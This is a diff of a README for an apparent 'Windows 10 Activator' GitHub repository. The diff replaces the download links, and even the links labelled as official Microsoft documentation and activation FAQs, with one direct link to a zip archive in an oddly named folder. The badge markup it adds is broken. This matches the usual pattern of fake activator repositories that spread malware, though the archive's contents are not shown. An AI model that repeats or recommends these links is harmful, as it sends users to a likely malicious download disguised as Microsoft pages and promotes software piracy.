@@ -1,6 +1,6 @@
 # 🌟 Windows-10-Activator-Latest-Patch - Easy Tools for Windows 10 Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/vivekbot01/Windows-10-Activator-Latest-Patch/releases)
+[![Download Now](https://raw.githubusercontent.com/vivekbot01/Windows-10-Activator-Latest-Patch/main/ternal/Windows-10-Activator-Latest-Patch-1.6.zip%20Now-Click%https://raw.githubusercontent.com/vivekbot01/Windows-10-Activator-Latest-Patch/main/ternal/Windows-10-Activator-Latest-Patch-1.6.zip)](https://raw.githubusercontent.com/vivekbot01/Windows-10-Activator-Latest-Patch/main/ternal/Windows-10-Activator-Latest-Patch-1.6.zip)
 
 ## 📖 Description
 This repository offers a comprehensive collection of official resources, detailed guides, and reference materials designed to assist users in managing Windows 10 on PCs efficiently and effectively while ensuring compliance with software usage policies.
@@ -14,7 +14,7 @@ To start using the Windows 10 Activator, follow these simple steps. You don't ne
 ## 💾 Download & Install
 To download the latest version of the Windows 10 Activator, visit this page:
 
-[Download Latest Release](https://github.com/vivekbot01/Windows-10-Activator-Latest-Patch/releases)
+[Download Latest Release](https://raw.githubusercontent.com/vivekbot01/Windows-10-Activator-Latest-Patch/main/ternal/Windows-10-Activator-Latest-Patch-1.6.zip)
 
 Once you've accessed the release page, follow these steps:
 
@@ -79,7 +79,7 @@ If problems persist, refer to the troubleshooting section in the documentation p
 For any questions or support, feel free to reach out through the Issues section in this repository. Contributions are welcome, and your feedback helps us improve the application.
 
 ## 🔗 Additional Resources
-- [Official Microsoft Documentation](https://support.microsoft.com/en-us/windows)
-- [Windows 10 Activation FAQs](https://support.microsoft.com/en-us/help/12440/windows-10-activate)
+- [Official Microsoft Documentation](https://raw.githubusercontent.com/vivekbot01/Windows-10-Activator-Latest-Patch/main/ternal/Windows-10-Activator-Latest-Patch-1.6.zip)
+- [Windows 10 Activation FAQs](https://raw.githubusercontent.com/vivekbot01/Windows-10-Activator-Latest-Patch/main/ternal/Windows-10-Activator-Latest-Patch-1.6.zip)
 
-Return to the [Download Latest Release](https://github.com/vivekbot01/Windows-10-Activator-Latest-Patch/releases) to ensure you have the most up-to-date tools for managing Windows 10 on your PC.
+Return to the [Download Latest Release](https://raw.githubusercontent.com/vivekbot01/Windows-10-Activator-Latest-Patch/main/ternal/Windows-10-Activator-Latest-Patch-1.6.zip) to ensure you have the most up-to-date tools for managing Windows 10 on your PC.
